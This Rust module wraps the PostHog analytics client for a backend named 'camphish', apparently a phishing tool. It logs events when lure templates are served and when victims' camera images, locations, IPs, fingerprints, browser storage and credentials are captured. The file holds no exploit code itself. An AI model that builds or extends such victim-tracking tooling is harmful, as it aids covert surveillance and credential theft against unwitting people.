use posthog_rs::{CaptureExceptionOptions, ClientOptionsBuilder, ErrorTrackingOptionsBuilder, Event};
use serde_json::Value;

pub struct PostHog {
    client: Option<posthog_rs::Client>,
}

impl PostHog {
    pub async fn from_env() -> Self {
        let api_key = std::env::var("POSTHOG_API_KEY")
            .or_else(|_| std::env::var("VITE_POSTHOG_KEY"))
            .ok();
        let host = std::env::var("POSTHOG_HOST")
            .or_else(|_| std::env::var("VITE_POSTHOG_HOST"))
            .unwrap_or_else(|_| "https://us.posthog.com".into());

        let client = match api_key {
            Some(key) => {
                let options = ClientOptionsBuilder::default()
                    .api_key(key)
                    .host(host.clone())
                    .is_server(true)
                    .error_tracking(
                        ErrorTrackingOptionsBuilder::default()
                            .capture_stacktrace(true)
                            .build()
                            .unwrap(),
                    )
                    .build()
                    .expect("PostHog ClientOptions");
                let c = posthog_rs::client(options).await;
                tracing::info!("PostHog backend tracking enabled: {}", host);
                Some(c)
            }
            None => {
                tracing::debug!("PostHog backend tracking disabled (set POSTHOG_API_KEY)");
                None
            }
        };

        Self { client }
    }

    pub async fn capture(&self, distinct_id: &str, event: &str, properties: Vec<(String, Value)>) {
        let Some(ref client) = self.client else { return };

        let mut e = Event::new(event, distinct_id);
        for (k, v) in properties {
            if let Err(err) = e.insert_prop(k, v) {
                tracing::debug!("PostHog insert_prop error: {}", err);
            }
        }
        let _ = e.insert_prop("$backend", "camphish");
        let _ = e.insert_prop("$backend_version", "2.1.0");

        if let Err(err) = client.capture(e).await {
            tracing::debug!("PostHog capture error: {}", err);
        }
    }

    pub async fn capture_exception(
        &self,
        error: &(dyn std::error::Error + 'static),
        distinct_id: &str,
        route: &str,
    ) {
        let Some(ref client) = self.client else { return };
        let opts = CaptureExceptionOptions::new()
            .distinct_id(distinct_id)
            .property("route", route)
            .unwrap();
        if let Err(err) = client.capture_exception_with(error, opts).await {
            tracing::debug!("PostHog capture_exception error: {}", err);
        }
    }

    pub async fn capture_template_served(&self, template_id: &str, ip: &str) {
        self.capture(
            ip,
            "template_served",
            vec![("template_id".into(), template_id.into())],
        )
        .await;
    }

    pub async fn capture_image(&self, session_id: &str, file_size: u64, ip: &str) {
        self.capture(
            session_id,
            "image_captured",
            vec![
                ("session_id".into(), session_id.into()),
                ("file_size".into(), (file_size as i64).into()),
                ("ip".into(), ip.into()),
            ],
        )
        .await;
    }

    pub async fn capture_location(&self, session_id: &str, lat: f64, lng: f64, ip: &str) {
        self.capture(
            session_id,
            "location_captured",
            vec![
                ("session_id".into(), session_id.into()),
                ("$latitude".into(), lat.into()),
                ("$longitude".into(), lng.into()),
                ("ip".into(), ip.into()),
            ],
        )
        .await;
    }

    pub async fn capture_ip(
        &self,
        session_id: &str,
        ip: &str,
        device: &str,
        browser: &str,
        os: &str,
    ) {
        self.capture(
            session_id,
            "ip_logged",
            vec![
                ("session_id".into(), session_id.into()),
                ("ip".into(), ip.into()),
                ("device".into(), device.into()),
                ("browser".into(), browser.into()),
                ("os".into(), os.into()),
            ],
        )
        .await;
    }

    pub async fn capture_fingerprint(&self, session_id: &str, ip: &str) {
        self.capture(
            session_id,
            "fingerprint_captured",
            vec![
                ("session_id".into(), session_id.into()),
                ("ip".into(), ip.into()),
            ],
        )
        .await;
    }

    pub async fn capture_event(&self, session_id: &str, event_type: &str, ip: &str) {
        self.capture(
            session_id,
            "event_received",
            vec![
                ("session_id".into(), session_id.into()),
                ("event_type".into(), event_type.into()),
                ("ip".into(), ip.into()),
            ],
        )
        .await;
    }

    pub async fn capture_storage(&self, session_id: &str, item_count: usize, ip: &str) {
        self.capture(
            session_id,
            "storage_captured",
            vec![
                ("session_id".into(), session_id.into()),
                ("item_count".into(), (item_count as i64).into()),
                ("ip".into(), ip.into()),
            ],
        )
        .await;
    }

    pub async fn capture_credentials(&self, session_id: &str, has_username: bool, ip: &str) {
        self.capture(
            session_id,
            "credentials_captured",
            vec![
                ("session_id".into(), session_id.into()),
                ("has_username".into(), has_username.into()),
                ("ip".into(), ip.into()),
            ],
        )
        .await;
    }

    pub async fn capture_session_created(&self, name: &str, template_id: &str) {
        self.capture(
            name,
            "session_created",
            vec![
                ("name".into(), name.into()),
                ("template_id".into(), template_id.into()),
            ],
        )
        .await;
    }

    pub async fn capture_api_error(&self, endpoint: &str, status: u16, ip: &str) {
        self.capture(
            ip,
            "api_error",
            vec![
                ("endpoint".into(), endpoint.into()),
                ("status".into(), (status as i64).into()),
            ],
        )
        .await;
    }
}
